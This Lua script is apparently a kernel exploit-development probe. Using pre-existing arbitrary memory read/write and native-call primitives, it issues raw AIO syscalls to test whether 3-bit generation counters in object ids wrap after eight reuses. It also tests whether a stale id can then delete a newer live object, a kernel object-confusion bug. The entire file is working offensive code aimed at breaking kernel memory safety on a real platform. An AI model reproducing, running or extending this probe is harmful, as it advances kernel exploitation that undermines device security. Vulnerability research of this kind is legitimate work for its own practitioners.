-- CRASH_CLASS: LOW
-- PROBE 561a: does an aio id repeat after eight reuses, and does a stale id
-- then resolve to the new live object?
--
-- The id is slot | generation << 13 and the generation is three bits
-- (docs/AIO_RANGE_14_10_EVIDENCE.md, lookup 0x8ad5a2a0). If the same slot is
-- reused immediately then the ninth create in that slot returns the first id
-- again. If it does, a delete carrying the stale id passes the generation
-- check and acts on the live object that now owns that id.

print("=== PROBE 561a: AIO GENERATION WRAP ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sc_create = mk(669)
local sc_poll = mk(664)
local sc_delete = mk(662)

local data = memory.alloc(0x100)
local out = memory.alloc(0x200)
for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end

local function create()
    for i = 0, 0x1FC, 4 do wd(N(out) + i, 0) end
    local ok, rv = pcall(function() return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out))) end)
    if not ok or N(rv) ~= 0 then return nil end
    return rd(N(out))
end
local function poll(id)
    local cell = memory.alloc(8)
    local st = memory.alloc(8)
    wd(N(cell), id); wd(N(st), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(st))) end)
    return rd(N(st)) or 0
end
local function del(id)
    local cell = memory.alloc(8)
    local st = memory.alloc(8)
    wd(N(cell), id); wd(N(st), 0xCCCCCCCC)
    local ok, rv = pcall(function() return sc_delete(uint64(N(cell)), uint64(1), uint64(N(st))) end)
    return rd(N(st)), N(rv)
end

print("[A] ten create/poll/delete cycles in a row")
local first = nil
local ids = {}
for i = 1, 12 do
    local id = create()
    if id == nil then print(string.format("    cycle %d: create failed", i)); break end
    if first == nil then first = id end
    ids[#ids + 1] = id
    local st = poll(id)
    local dst, drv = del(id)
    print(string.format("    cycle %2d id=%08X slot=%04X gen=%X poll=%08X delete=%08X",
        i, id, id % 0x2000, (id - id % 0x2000) / 0x2000, st, dst or 0))
    if not alive() then print("DEAD"); return end
end

print("")
print("[B] is the ninth id equal to the first?")
if #ids >= 9 then
    print(string.format("    first=%08X ninth=%08X equal=%s", ids[1], ids[9], tostring(ids[1] == ids[9])))
else
    print("    fewer than nine cycles")
end

print("")
print("[C] create a live object, then delete with the stale first id")
local live = create()
if live == nil then print("    create failed"); return end
print(string.format("    live id=%08X poll=%08X", live, poll(live)))
local dst, drv = del(ids[1])
print(string.format("    delete(stale %08X) status=%08X ret=%d", ids[1], dst or 0, drv))
print(string.format("    alive=%s", tostring(alive())))
if alive() then
    local st2, drv2 = del(live)
    print(string.format("    delete(live %08X) status=%08X ret=%d", live, st2 or 0, drv2))
end
print(string.format("    final alive=%s", tostring(alive())))
print("=== DONE ===")
